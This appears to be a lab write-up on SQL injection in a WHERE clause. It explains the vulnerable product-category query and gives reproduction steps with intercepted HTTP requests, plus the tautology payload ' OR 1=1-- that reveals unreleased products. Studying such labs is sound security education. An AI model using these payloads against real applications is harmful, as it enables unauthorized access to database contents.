# SQL-Injection-Labs-

1 Lab -: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

1. Lab Information

Lab Name: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

Severity: Medium

Vulnerability Type: SQL Injection (SQLi)

2. Vulnerability Description

The application is vulnerable to SQL Injection in the product category parameter. When a user selects a category, the application constructs a SQL query using unsanitized user input.

Original query:

SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1

The released = 1 condition is intended to display only released products. By injecting SQL syntax into the category parameter, an attacker can modify the query logic and retrieve hidden or unreleased products.

3. Impact

An attacker can:

Access hidden or unreleased products.
Bypass application restrictions.
Retrieve sensitive information from the database.
Potentially perform further SQL Injection attacks.
4. Steps to Reproduce
Step 1: Browse the Application

Navigate to the product page and select any category.

Example URL:

https://example.com/filter?category=Gifts
Step 2: Intercept the Request

Capture the request using Burp Suite.

Original request:

GET /filter?category=Gifts HTTP/1.1
Host: example.com
Step 3: Inject SQL Payload

Modify the category parameter to:

Gifts' OR 1=1--

Modified request:

GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1
Host: example.com
5. Technical Analysis

The application builds the query as:

SELECT * FROM products
WHERE category = 'Gifts' OR 1=1--'
AND released = 1

Explanation:

OR 1=1 is always true.
-- comments out the remaining query.
The condition released = 1 is ignored.

Final effective query:

SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1

Since OR 1=1 is always true, all products are returned, including unreleased products.

6. Proof of Concept
Payload
' OR 1=1--
Result
All products become visible.
Hidden/unreleased products are displayed.
Lab marked as solved.
